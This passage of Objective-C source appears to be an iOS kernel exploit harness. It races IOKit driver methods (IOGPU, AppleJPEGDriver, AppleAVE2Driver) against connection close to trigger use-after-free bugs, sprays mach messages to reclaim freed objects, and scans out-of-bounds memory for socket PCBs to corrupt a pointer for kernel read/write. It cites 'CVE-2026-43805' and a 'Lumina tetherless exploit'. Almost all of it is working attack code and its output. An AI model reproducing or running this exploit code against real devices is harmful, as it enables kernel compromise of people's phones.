        // Fill with marker
        for (uint64_t i = 0; i < searchMappingSize; i += sizeof(uint64_t))
            *(uint64_t *)(searchMappings[s] + i) = randomMarker;

        // Create memory entry
        mach_vm_size_t moSz = searchMappingSize;
        searchMOs[s] = 0;
        kr = mach_make_memory_entry_64(mach_task_self(), &moSz, searchMappings[s], VM_PROT_DEFAULT, &searchMOs[s], 0);
        if (kr != KERN_SUCCESS) { [out appendFormat:@"mem_entry failed for mapping %d\n", s]; continue; }

        // mlock via IOSurface
        NSDictionary *lockParams = @{
            @"IOSurfaceAddress": @(searchMappings[s]),
            @"IOSurfaceAllocSize": @(searchMappingSize),
        };
        IOSurfaceRef lockSurf = pSurfCreate((__bridge CFDictionaryRef)lockParams);
        if (lockSurf) {
            void *lockAddr = pSurfGetBase(lockSurf);
            (void)lockAddr;
        }
    }

    goSync = 1;

    // Scan OOB for socket PCBs
    // PCB has: inp_gencnt at +0x110, executable name string, icmp6filt pointer
    // We look for our executable name in the OOB data
    char execPath[PATH_MAX];
    uint32_t sz = PATH_MAX;
    _NSGetExecutablePath(execPath, &sz);
    char *execName = strrchr(execPath, '/');
    if (execName) execName++; else execName = execPath;
    size_t execNameLen = strlen(execName);
    [out appendFormat:@"searching for execName '%s' (len=%zu)\n", execName, execNameLen];

    #define OOB_OFFSET 0x100
    #define OOB_SIZE 0xf00

    int totalHits = 0;
    int pcbFound = 0;
    uint8_t *readBuffer = calloc(1, OOB_SIZE);

    for (int s = 0; s < numSearchMappings && !pcbFound; s++) {
        if (!searchMOs[s]) continue;
        [out appendFormat:@"scanning mapping %d (0x%llx, size 0x%llx)\n", s, searchMappings[s], searchMappingSize];

        mach_vm_offset_t seekingOffset = 0;
        while (seekingOffset <= searchMappingSize - pcSize) {
            // Restore pc mapping
            mach_vm_address_t addr = pcAddress;
            mach_vm_map(mach_task_self(), &addr, pcSize, 0,
                        VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
                        pcObject, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
            *(uint64_t *)(pcPtr + 0x3f00) = randomMarker;

            // Race
            targetObject_sync = searchMOs[s];
            targetObjectOffset_sync = seekingOffset;
            raceSync = 1;

            struct iovec iov;
            iov.iov_base = (void *)(pcAddress + 0x3f00);
            iov.iov_len = OOB_OFFSET + OOB_SIZE;
            ssize_t w = pwritev(readFd, &iov, 1, 0x3f00);
            while (raceSync == 1);

            // Restore pc mapping
            addr = pcAddress;
            mach_vm_map(mach_task_self(), &addr, pcSize, 0,
                        VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
                        pcObject, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);

            // DarkSword approach: only check when pwritev fails (race signal)
            if (w == -1) {
                pread(readFd, readBuffer, OOB_SIZE, 0x3f00 + OOB_OFFSET);
                uint64_t marker = *(uint64_t *)readBuffer;
                if (marker != randomMarker) {
                    totalHits++;
                    // Search for executable name in OOB data
                    void *found = memmem(readBuffer, OOB_SIZE, execName, execNameLen);
                    if (found) {
                        uint64_t foundOffset = (uint8_t *)found - readBuffer;
                        [out appendFormat:@"PCB FOUND at mapping %d offset 0x%llx (execName at +0x%llx)\n",
                         s, seekingOffset, foundOffset];
                        // Dump some bytes around the found name
                        uint64_t dumpStart = foundOffset > 0x40 ? foundOffset - 0x40 : 0;
                        [out appendFormat:@"dump @0x%llx:\n", dumpStart];
                        for (int i = 0; i < 0x80 && dumpStart + i < OOB_SIZE; i += 16) {
                            [out appendFormat:@"  %04llx: %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x\n",
                             dumpStart + i,
                             readBuffer[dumpStart+i], readBuffer[dumpStart+i+1], readBuffer[dumpStart+i+2], readBuffer[dumpStart+i+3],
                             readBuffer[dumpStart+i+4], readBuffer[dumpStart+i+5], readBuffer[dumpStart+i+6], readBuffer[dumpStart+i+7],
                             readBuffer[dumpStart+i+8], readBuffer[dumpStart+i+9], readBuffer[dumpStart+i+10], readBuffer[dumpStart+i+11],
                             readBuffer[dumpStart+i+12], readBuffer[dumpStart+i+13], readBuffer[dumpStart+i+14], readBuffer[dumpStart+i+15]];
                        }
                        pcbFound = 1;
                        break;
                    }
                }
            }
            seekingOffset += 4096;
        }
        if (pcbFound) break;
    }

    goSync = 0;
    raceSync = 1;
    usleep(10000);
    targetObject_sync = 0;

    [out appendFormat:@"\n=== RESULT ===\n"];
    [out appendFormat:@"total OOB hits: %d\n", totalHits];
    if (pcbFound) {
        [out appendString:@"PCB FOUND! Can corrupt for KRW.\n"];
        [out appendString:@"Next: corrupt icmp6filt pointer → setsockopt/getsockopt KRW.\n"];
    } else {
        [out appendString:@"No PCB found in OOB region.\n"];
        [out appendString:@"May need more sockets or larger search mappings.\n"];
    }

    // Cleanup
    for (int s = 0; s < 8; s++) {
        if (searchMOs[s]) mach_port_deallocate(mach_task_self(), searchMOs[s]);
        if (searchMappings[s]) mach_vm_deallocate(mach_task_self(), searchMappings[s], searchMappingSize);
    }
    for (NSNumber *port in socketPorts)
        mach_port_deallocate(mach_task_self(), port.unsignedIntValue);
    mach_vm_deallocate(mach_task_self(), pcAddress, pcSize);
    mach_port_deallocate(mach_task_self(), pcObject);
    close(readFd);
    close(writeFd);
    CFRelease(surface);
    free(readBuffer);

    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}

// ===== P010 KRW — Lumina tetherless exploit =====
// CVE-2026-43805: IOGPUDeviceUserClient method-vs-close race
// UAF on GPU device (0x120 bytes, standard kalloc, no PPL)
// s_submit_command_buffers (sel~5) → controlled 32-bit increment at arbitrary address
// Phase 1: race only (confirm window). Phase 2: race + mach spray (prove KRW)

+ (NSString *)runP010KRW {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"=== P010 KRW — Lumina tetherless exploit ===\n"];
    [out appendString:@"CVE-2026-43805: IOGPUDeviceUserClient UAF\n"];
    [out appendString:@"Phase 1: race sel=8 vs close (no spray)\n"];
    [out appendString:@"Phase 2: race + mach spray (0x120 bytes)\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iokit || !iogpu) {
        [out appendFormat:@"STOP: iokit=%p iogpu=%p\n", iokit, iogpu];
        return out;
    }

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");

    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef uint32_t (*QueueGetID_t)(void *);
    DevCreate_t pDevCreate = (DevCreate_t)dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pGetConn = (GetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = (DevRelease_t)dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = (QueueCreate_t)dlsym(iogpu, "IOGPUCommandQueueCreate");
    QueueGetID_t pGetID = (QueueGetID_t)dlsym(iogpu, "IOGPUCommandQueueGetID");

    [out appendFormat:@"symbols: create=%p getConn=%p release=%p call=%p queueCreate=%p getID=%p\n",
        pDevCreate, pGetConn, pDevRelease, pCall, pQueueCreate, pGetID];
    if (!pDevCreate || !pGetConn || !pQueueCreate) {
        [out appendString:@"STOP: missing IOGPU functions\n"];
        return out;
    }

    // Find IOGPU service
    CFMutableDictionaryRef m = pMatching("IOGPU");
    io_service_t svc = m ? pGet(*pMainPort, m) : 0;
    if (!svc) {
        [out appendString:@"STOP: no IOGPU service\n"];
        return out;
    }
    [out appendFormat:@"IOGPU service=%u\n", svc];

    // Create device + queue (sel=26 needs a qid)
    void *dev = pDevCreate(svc);
    if (!dev) { [out appendString:@"STOP: no dev\n"]; pRelease(svc); return out; }
    io_connect_t conn = pGetConn(dev);
    [out appendFormat:@"dev=%p conn=%u\n", dev, conn];

    // Create queue — copy device fields into args struct
    void *args = calloc(1, 0x410);
    *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev + 0x08);
    *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
    void *queue = pQueueCreate(dev, args, 0x410);
    free(args);
    if (!queue) { [out appendString:@"STOP: no queue\n"]; pDevRelease(dev); pRelease(svc); return out; }
    uint32_t qid = pGetID ? pGetID(queue) : 1;
    [out appendFormat:@"queue=%p qid=%u\n", queue, qid];

    // sel=8 (sc=1) works on 22H311. sel=26 does NOT exist on this version.
    // sel=8 takes 1 scalar (qid). Race it vs IOServiceClose for UAF.

    // Serial baseline
    {
        uint64_t sc[1] = {qid};
        kern_return_t r8 = pCall(conn, 8, sc, 1, NULL, 0, NULL, NULL, NULL, NULL);
        [out appendFormat:@"serial sel=8 -> 0x%08x\n", (unsigned)r8];
        uint64_t sc16[1] = {qid};
        kern_return_t r16 = pCall(conn, 16, sc16, 1, NULL, 0, NULL, NULL, NULL, NULL);
        [out appendFormat:@"serial sel=16 -> 0x%08x\n", (unsigned)r16];
    }

    // === Phase 1: Multi-thread sel=8 race (4 callers + 1 closer) ===
    [out appendString:@"\n=== Phase 1: Multi-thread sel=8 (4 callers + 1 closer) ===\n"];
    {
        void *dev1 = pDevCreate(svc);
        io_connect_t conn1 = dev1 ? pGetConn(dev1) : 0;
        void *args1 = calloc(1, 0x410);
        *(uint32_t *)((uint8_t *)args1 + 0x400) = *(uint32_t *)((uint8_t *)dev1 + 0x08);
        *(uint8_t *)((uint8_t *)args1 + 0x404) = *(uint8_t *)((uint8_t *)dev1 + 0x08);
        void *queue1 = pQueueCreate(dev1, args1, 0x410);
        free(args1);
        uint32_t qid1 = pGetID ? pGetID(queue1) : 1;
        [out appendFormat:@"race1: conn=%u qid=%u\n", conn1, qid1];
        if (!conn1 || !queue1) { [out appendString:@"STOP: no conn/queue\n"]; goto phase2; }

        __block volatile int go = 0;
        __block volatile int totalHits = 0;
        __block volatile int totalDead = 0;
        __block kern_return_t closeRc = -1;

        dispatch_group_t grp = dispatch_group_create();
        // 4 caller threads
        for (int t = 0; t < 4; t++) {
            dispatch_queue_t tq = dispatch_queue_create("p010.caller", NULL);
            dispatch_group_async(grp, tq, ^{
                while (!go) {}
                uint64_t sc[1] = {qid1};
                for (int i = 0; i < 25000; i++) {
                    kern_return_t r = pCall(conn1, 8, sc, 1, NULL, 0, NULL, NULL, NULL, NULL);
                    if (r == 0) totalHits++;
                    else if (r == 0x10000003) totalDead++;
                }
            });
        }
        // 1 closer thread
        dispatch_queue_t cq = dispatch_queue_create("p010.closer", NULL);
        dispatch_group_async(grp, cq, ^{
            while (!go) {}
            closeRc = pClose(conn1);
        });

        go = 1;
        dispatch_group_wait(grp, DISPATCH_TIME_FOREVER);

        [out appendFormat:@"sel=8 4-thread: hits=%d dead=%d close=0x%08x\n",
            totalHits, totalDead, (unsigned)closeRc];
        if (dev1 && pDevRelease) pDevRelease(dev1);
    }

    // === Phase 1b: Multi-thread sel=16 race ===
    [out appendString:@"\n=== Phase 1b: Multi-thread sel=16 (4 callers + 1 closer) ===\n"];
    {
        void *dev1b = pDevCreate(svc);
        io_connect_t conn1b = dev1b ? pGetConn(dev1b) : 0;
        void *args1b = calloc(1, 0x410);
        *(uint32_t *)((uint8_t *)args1b + 0x400) = *(uint32_t *)((uint8_t *)dev1b + 0x08);
        *(uint8_t *)((uint8_t *)args1b + 0x404) = *(uint8_t *)((uint8_t *)dev1b + 0x08);
        void *queue1b = pQueueCreate(dev1b, args1b, 0x410);
        free(args1b);
        uint32_t qid1b = pGetID ? pGetID(queue1b) : 1;
        [out appendFormat:@"race1b: conn=%u qid=%u\n", conn1b, qid1b];
        if (!conn1b || !queue1b) { [out appendString:@"STOP: no conn/queue\n"]; goto phase2; }

        __block volatile int go = 0;
        __block volatile int totalHits = 0;
        __block volatile int totalDead = 0;
        __block kern_return_t closeRc = -1;

        dispatch_group_t grp = dispatch_group_create();
        for (int t = 0; t < 4; t++) {
            dispatch_queue_t tq = dispatch_queue_create("p010.caller16", NULL);
            dispatch_group_async(grp, tq, ^{
                while (!go) {}
                uint64_t sc[1] = {qid1b};
                for (int i = 0; i < 25000; i++) {
                    kern_return_t r = pCall(conn1b, 16, sc, 1, NULL, 0, NULL, NULL, NULL, NULL);
                    if (r == 0) totalHits++;
                    else if (r == 0x10000003) totalDead++;
                }
            });
        }
        dispatch_queue_t cq = dispatch_queue_create("p010.closer16", NULL);
        dispatch_group_async(grp, cq, ^{
            while (!go) {}
            closeRc = pClose(conn1b);
        });

        go = 1;
        dispatch_group_wait(grp, DISPATCH_TIME_FOREVER);

        [out appendFormat:@"sel=16 4-thread: hits=%d dead=%d close=0x%08x\n",
            totalHits, totalDead, (unsigned)closeRc];
        if (dev1b && pDevRelease) pDevRelease(dev1b);
    }

phase2:
    // === Phase 2: Multi-thread sel=8 + mach spray ===
    [out appendString:@"\n=== Phase 2: Multi-thread sel=8 + mach spray (4 callers + 1 close+spray) ===\n"];
    [out appendString:@"Spray: 100 mach msgs, total kalloc=0x120 (GPU device size)\n"];

    // Fresh device+queue for spray race
    void *dev2 = pDevCreate(svc);
    io_connect_t conn2 = dev2 ? pGetConn(dev2) : 0;
    void *args2 = calloc(1, 0x410);
    *(uint32_t *)((uint8_t *)args2 + 0x400) = *(uint32_t *)((uint8_t *)dev2 + 0x08);
    *(uint8_t *)((uint8_t *)args2 + 0x404) = *(uint8_t *)((uint8_t *)dev2 + 0x08);
    void *queue2 = pQueueCreate(dev2, args2, 0x410);
    free(args2);
    uint32_t qid2 = pGetID ? pGetID(queue2) : 1;
    [out appendFormat:@"race2: conn=%u qid=%u\n", conn2, qid2];

    if (conn2 && queue2) {
        mach_port_t sprayPort = 0;
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &sprayPort);

        __block volatile int go = 0;
        __block volatile int totalHits = 0;
        __block volatile int totalDead = 0;
        __block kern_return_t closeRc = -1;
        __block io_connect_t bconn = conn2;
        __block uint32_t bqid = qid2;

        dispatch_group_t grp = dispatch_group_create();
        // 4 caller threads
        for (int t = 0; t < 4; t++) {
            dispatch_queue_t tq = dispatch_queue_create("p010.spray", NULL);
            dispatch_group_async(grp, tq, ^{
                while (!go) {}
                uint64_t sc[1] = {bqid};
                for (int i = 0; i < 25000; i++) {
                    kern_return_t r = pCall(bconn, 8, sc, 1, NULL, 0, NULL, NULL, NULL, NULL);
                    if (r == 0) totalHits++;
                    else if (r == 0x10000003) totalDead++;
                }
            });
        }
        // 1 closer + spray thread
        dispatch_queue_t cq = dispatch_queue_create("p010.sprayclose", NULL);
        dispatch_group_async(grp, cq, ^{
            while (!go) {}
            closeRc = pClose(bconn);
            // Spray 100 mach messages (0x120 bytes each) to reclaim freed GPU device
            for (int s = 0; s < 100; s++) {
                mach_msg_header_t *msg = (mach_msg_header_t *)calloc(1, 0x120);
                msg->msgh_bits = MACH_MSGH_BITS_REMOTE(MACH_MSG_TYPE_COPY_SEND);
                msg->msgh_size = 0x120;
                msg->msgh_remote_port = sprayPort;
                msg->msgh_local_port = MACH_PORT_NULL;
                msg->msgh_voucher_port = MACH_PORT_NULL;
                msg->msgh_id = 0;
                uint8_t *body = (uint8_t *)msg + 0x1c;
                *(uint64_t *)(body + 0x6c) = 0x4141414141414141ULL;
                *(uint64_t *)(body + 0x70) = 0x4242424242424242ULL;
                *(uint64_t *)(body + 0x74) = 0x4343434343434343ULL;
                mach_msg(msg, MACH_SEND_MSG, 0x120, 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
                free(msg);
            }
        });

        go = 1;
        dispatch_group_wait(grp, DISPATCH_TIME_FOREVER);

        [out appendFormat:@"Phase 2: hits=%d dead=%d close=0x%08x\n",
            totalHits, totalDead, (unsigned)closeRc];
        [out appendString:@"panic = UAF + spray landed. survived = need different approach.\n"];

        mach_port_deallocate(mach_task_self(), sprayPort);
        if (dev2 && pDevRelease) pDevRelease(dev2);
    }

    [out appendFormat:@"\n=== Summary ===\n"];
    [out appendString:@"Phase 1: sel=8 race (10000 calls vs 1 close)\n"];
    [out appendString:@"Phase 2: sel=8 race + mach spray (10000 calls vs 1 close + 100 spray)\n"];
    [out appendString:@"Panic = UAF confirmed (do NOT re-tap). Reboot and try sel=16 instead.\n"];

    pRelease(svc);
    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}

// Combined primitive race: P010 (IOGPU) + P008 (JPEG) + P001 (AVE)
// Opens each driver, sweeps selectors, races valid ones vs close.
// Panic = UAF on that primitive. Survived = MIG serialization blocks it.
+ (NSString *)runCombinedRace {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"=== Combined Primitive Race (P010 + P008 + P001) ===\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpen_t pOpen = dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");

    // Helper: race a selector vs close on a given connection
    void (^raceSel)(io_connect_t, uint32_t, uint32_t, NSString *) = ^(io_connect_t c, uint32_t sel, uint32_t sc, NSString *label) {
        __block volatile int go = 0;
        __block volatile int hits = 0;
        __block volatile int dead = 0;
        __block kern_return_t closeRc = -1;

        dispatch_queue_t q1 = dispatch_queue_create("race.call", NULL);
        dispatch_queue_t q2 = dispatch_queue_create("race.close", NULL);
        dispatch_group_t grp = dispatch_group_create();

        dispatch_group_async(grp, q1, ^{
            while (!go) {}
            uint64_t sbuf[4] = {1, 0, 0, 0};
            for (int i = 0; i < 50000; i++) {
                kern_return_t r = pCall(c, sel, sbuf, sc, NULL, 0, NULL, NULL, NULL, NULL);
                if (r == 0) hits++;
                else if (r == 0x10000003) dead++;
            }
        });

        dispatch_group_async(grp, q2, ^{
            while (!go) {}
            closeRc = pClose(c);
        });

        go = 1;
        dispatch_group_wait(grp, DISPATCH_TIME_FOREVER);

        [out appendFormat:@"  %@ sel=%u sc=%u: hits=%d dead=%d close=0x%08x\n",
            label, sel, sc, hits, dead, (unsigned)closeRc];
    };

    // Test each driver
    const char *drivers[] = {"IOGPU", "AppleJPEGDriver", "AppleAVE2Driver"};
    const char *labels[] = {"P010 IOGPU", "P008 JPEG", "P001 AVE"};
    int ndrivers = 3;

    for (int d = 0; d < ndrivers; d++) {
        [out appendFormat:@"--- %s ---\n", labels[d]];

        CFMutableDictionaryRef m = pMatching(drivers[d]);
        io_service_t svc = m ? pGet(*pMainPort, m) : 0;
        if (!svc) {
            [out appendFormat:@"  service NOT FOUND\n\n"];
            continue;
        }

        io_connect_t conn = 0;
        kern_return_t kr = pOpen(svc, mach_task_self(), 0, &conn);
        pRelease(svc);
        if (kr != KERN_SUCCESS || !conn) {
            [out appendFormat:@"  open FAILED: 0x%08x\n\n", (unsigned)kr];
            continue;
        }
        [out appendFormat:@"  conn=%u\n", conn];

        // Sweep selectors to find valid ones (sc=0 and sc=1)
        for (uint32_t sel = 0; sel <= 40; sel++) {
            for (uint32_t sc = 0; sc <= 1; sc++) {
                uint64_t sbuf[1] = {1};
                uint32_t osc = 0; size_t oss = 0;
                kern_return_t r = pCall(conn, sel, sbuf, sc, NULL, 0, NULL, &osc, NULL, &oss);
                if (r != 0xe00002c2 && r != 0x10000003) {
                    [out appendFormat:@"  found sel=%u sc=%u: rc=0x%08x\n", sel, sc, (unsigned)r];
                }
            }
        }

        // Close this connection and open a fresh one for the race
        pClose(conn);
        m = pMatching(drivers[d]);
        svc = m ? pGet(*pMainPort, m) : 0;
        if (!svc) { [out appendString:@"  no svc for race\n\n"]; continue; }
        kr = pOpen(svc, mach_task_self(), 0, &conn);
        pRelease(svc);
        if (kr != KERN_SUCCESS || !conn) {
            [out appendFormat:@"  race open FAILED: 0x%08x\n\n", (unsigned)kr];
            continue;
        }

        // Race each valid-looking selector
        // For IOGPU, we know sel=8 and sel=16 work with sc=1
        // For others, try sel=0..40 with sc=0 and sc=1
        for (uint32_t sel = 0; sel <= 40; sel++) {
            for (uint32_t sc = 0; sc <= 1; sc++) {
                // Quick check if selector is valid
                uint64_t sbuf[1] = {1};
                uint32_t osc = 0; size_t oss = 0;
                kern_return_t r = pCall(conn, sel, sbuf, sc, NULL, 0, NULL, &osc, NULL, &oss);
                if (r == 0xe00002c2 || r == 0x10000003) continue;

                // This selector is valid — race it
                // Need fresh conn for each race
                pClose(conn);
                m = pMatching(drivers[d]);
                svc = m ? pGet(*pMainPort, m) : 0;
                if (!svc) break;
                kr = pOpen(svc, mach_task_self(), 0, &conn);
                pRelease(svc);
                if (kr != KERN_SUCCESS || !conn) break;

                raceSel(conn, sel, sc, [NSString stringWithFormat:@"%s", labels[d]]);
            }
        }

        if (conn) pClose(conn);
        [out appendString:@"\n"];
    }

    [out appendString:@"\n=== Summary ===\n"];
    [out appendString:@"Panic = UAF on that primitive.\n"];
    [out appendString:@"All survived = MIG serialization blocks all single-conn races.\n"];
    [out appendString:@"Next: pivot to tethered KRW to study kernel objects directly.\n"];
    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}

// P008 JPEG focused race: race sel=5 (decode, dereferences surfaces/sessions)
// and sel=0/sel=2 (simple) vs IOServiceClose.
// sel=5 needs IOSurfaces + 0x1000 struct. This method actually processes
// data and dereferences kernel objects — best chance for UAF.
+ (NSString *)runP008Race {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"=== P008 JPEG Focused Race ===\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iosH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iosH) iosH = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iokit || !iosH) { [out appendString:@"STOP dlopen\n"]; return out; }

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpen_t pOpen = dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    IOSurfaceCreate_t iosCreate = dlsym(iosH, "IOSurfaceCreate");
    IOSurfaceGetID_t iosGetID = dlsym(iosH, "IOSurfaceGetID");
    IOSurfaceGetAllocSize_t iosAlloc = dlsym(iosH, "IOSurfaceGetAllocSize");
    if (!pMatching || !pGet || !pOpen || !pClose || !pCall || !pMainPort ||
        !iosCreate || !iosGetID || !iosAlloc) {
        [out appendString:@"STOP dlsym\n"]; return out;
    }

    // Create IOSurfaces for sel=5 struct
    NSDictionary *props = @{
        @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
        @"IOSurfaceBytesPerElement": @4,
        @"IOSurfaceBytesPerRow": @(64 * 4),
        @"IOSurfaceAllocSize": @(64 * 64 * 4),
        @"IOSurfacePixelFormat": @((unsigned int)'BGRA'),
    };
    IOSurfaceRef src = iosCreate((__bridge CFDictionaryRef)props);
    IOSurfaceRef dst = iosCreate((__bridge CFDictionaryRef)props);
    if (!src || !dst) { [out appendString:@"STOP IOSurfaceCreate\n"]; return out; }
    uint32_t srcID = iosGetID(src);
    uint32_t dstID = iosGetID(dst);
    size_t alloc = iosAlloc(src);
    [out appendFormat:@"src id=%u dst id=%u alloc=%zu\n", srcID, dstID, alloc];

    // Build sel=5 struct (0x1000 bytes)
    enum { kStruct = 0x1000 };
    uint8_t *s5buf = calloc(1, kStruct);
    uint32_t *u32 = (uint32_t *)s5buf;
    u32[0] = 64; u32[1] = 64; u32[5] = 64; u32[6] = 64;
    *(uint64_t *)(s5buf + 0x30) = srcID;
    *(uint64_t *)(s5buf + 0x38) = dstID;
    u32[0x12] = 1;
    *(uint32_t *)(s5buf + 0x80) = (uint32_t)alloc;

    // Helper to open JPEG driver
    io_connect_t (^openJPEG)(void) = ^{
        CFMutableDictionaryRef m = pMatching("AppleJPEGDriver");
        io_service_t s = m ? pGet(*pMainPort, m) : 0;
        if (!s) return (io_connect_t)0;
        io_connect_t c = 0;
        pOpen(s, mach_task_self(), 0, &c);
        pRelease(s);
        return c;
    };

    // Helper: race a selector vs close
    void (^raceSel)(uint32_t, uint32_t, const void *, size_t, NSString *) = ^
        (uint32_t sel, uint32_t sc, const void *sbuf, size_t ss, NSString *label) {
        io_connect_t c = openJPEG();
        if (!c) { [out appendFormat:@"  %@: open FAILED\n", label]; return; }

        __block volatile int go = 0;
        __block volatile int hits = 0;
        __block volatile int dead = 0;
        __block volatile int errs = 0;
        __block kern_return_t closeRc = -1;
        __block io_connect_t bc = c;

        dispatch_queue_t q1 = dispatch_queue_create("p008.call", NULL);
        dispatch_queue_t q2 = dispatch_queue_create("p008.close", NULL);
        dispatch_group_t grp = dispatch_group_create();

        dispatch_group_async(grp, q1, ^{
            while (!go) {}
            uint64_t scbuf[4] = {1, 0, 0, 0};
            void *localBuf = sbuf ? malloc(ss) : NULL;
            if (sbuf) memcpy(localBuf, sbuf, ss);
            for (int i = 0; i < 50000; i++) {
                kern_return_t r = pCall(bc, sel, scbuf, sc, localBuf, ss, NULL, NULL, NULL, NULL);
                if (r == 0) hits++;
                else if (r == 0x10000003) dead++;
                else errs++;
            }
            free(localBuf);
        });

        dispatch_group_async(grp, q2, ^{
            while (!go) {}
            closeRc = pClose(bc);
        });

        go = 1;
        dispatch_group_wait(grp, DISPATCH_TIME_FOREVER);

        [out appendFormat:@"  %@: hits=%d dead=%d errs=%d close=0x%08x\n",
            label, hits, dead, errs, (unsigned)closeRc];
    };

    // Race sel=0 (simple, sc=0)
    [out appendString:@"--- sel=0 race ---\n"];
    raceSel(0, 0, NULL, 0, @"sel=0 sc=0");

    // Race sel=2 (simple, sc=0)
    [out appendString:@"--- sel=2 race ---\n"];
    raceSel(2, 0, NULL, 0, @"sel=2 sc=0");

    // Race sel=5 (decode, sc=0 + struct 0x1000)
    [out appendString:@"--- sel=5 race (decode, struct=0x1000) ---\n"];
    raceSel(5, 0, s5buf, kStruct, @"sel=5 sc=0 ss=0x1000");

    // Race sel=8 (sc=0, returned 0xe00002bc = unsupported but exists)
    [out appendString:@"--- sel=8 race ---\n"];
    raceSel(8, 0, NULL, 0, @"sel=8 sc=0");

    // === Two-connection race ===
    // Open TWO connections to JPEG. Call sel=0 on A, close B.
    // If A and B share kernel state, closing B frees an object A dereferences.
    [out appendString:@"\n--- Two-connection race (A=method, B=close) ---\n"];
    {
        CFMutableDictionaryRef m = pMatching("AppleJPEGDriver");
        io_service_t svc = m ? pGet(*pMainPort, m) : 0;
        if (!svc) { [out appendString:@"STOP no svc\n"]; goto done; }

        io_connect_t connA = 0, connB = 0;
        pOpen(svc, mach_task_self(), 0, &connA);
        pOpen(svc, mach_task_self(), 0, &connB);
        pRelease(svc);
        [out appendFormat:@"connA=%u connB=%u\n", connA, connB];
        if (!connA || !connB) { [out appendString:@"STOP no conns\n"]; goto done; }

        __block volatile int go = 0;
        __block volatile int hits = 0;
        __block volatile int dead = 0;
        __block volatile int errs = 0;
        __block kern_return_t closeRc = -1;

        dispatch_queue_t q1 = dispatch_queue_create("p008.2c.call", NULL);
        dispatch_queue_t q2 = dispatch_queue_create("p008.2c.close", NULL);
        dispatch_group_t grp = dispatch_group_create();

        // Thread A: call sel=0 on connA
        dispatch_group_async(grp, q1, ^{
            while (!go) {}
            uint64_t sc[1] = {0};
            for (int i = 0; i < 50000; i++) {
                kern_return_t r = pCall(connA, 0, sc, 0, NULL, 0, NULL, NULL, NULL, NULL);
                if (r == 0) hits++;
                else if (r == 0x10000003) dead++;
                else errs++;
            }
        });

        // Thread B: close connB (different connection!)
        dispatch_group_async(grp, q2, ^{
            while (!go) {}
            closeRc = pClose(connB);
        });

        go = 1;
        dispatch_group_wait(grp, DISPATCH_TIME_FOREVER);

        [out appendFormat:@"2-conn: hits=%d dead=%d errs=%d closeB=0x%08x\n",
            hits, dead, errs, (unsigned)closeRc];
        [out appendString:@"panic = shared state UAF. survived = no shared state.\n"];

        if (connA) pClose(connA);
    }

    // === Two-connection race: close A, method on B ===
    [out appendString:@"\n--- Two-connection race (A=close, B=method) ---\n"];
    {
        CFMutableDictionaryRef m = pMatching("AppleJPEGDriver");
